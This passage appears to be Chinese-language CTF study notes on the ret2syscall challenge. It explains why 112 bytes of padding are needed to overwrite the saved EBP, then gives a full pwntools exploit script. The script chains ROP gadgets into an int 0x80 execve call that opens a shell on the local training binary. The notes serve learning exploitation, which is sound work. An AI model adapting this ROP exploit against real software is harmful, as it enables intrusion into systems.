+ 只要构造出ROP链，问题就迎刃而解

+ 另外应该是 `b'A' * 112` 而不是乘108是因为比如在这里你想覆盖掉 `EBP` 的值

  ![image-20201018182358917](https://cdn.jsdelivr.net/gh/smallzhong/picgo-pic-bed/image-20201018182358917.png)

  那么只写入 `0xd184 - 0xd188 == 4` 即4个字节的数据是不够的，这只能覆盖掉当前的值， `0xfffd188` 那里的 `EBP` 并没有被覆盖到。所以需要 `0xd184 - 0xd188 + 4` 个字节的数据才能覆盖我们想要覆盖的东西。

  ```python3
  #!usr/python
  
  from pwn import *
  
  io = process("./ret2syscall")
  
  bin_sh = 0x080BE408
  pop_eax_ret = 0x080bb196
  pop_edx_pop_ecx_pop_ebx_ret = 0x0806eb90
  int_80h = 0x08049421
  
  payload = flat([b'A' * 112, pop_eax_ret, 0xb, 
  		pop_edx_pop_ecx_pop_ebx_ret, 0, 0, bin_sh, int_80h])
  
  io.sendline(payload)
  io.interactive()
  ```

  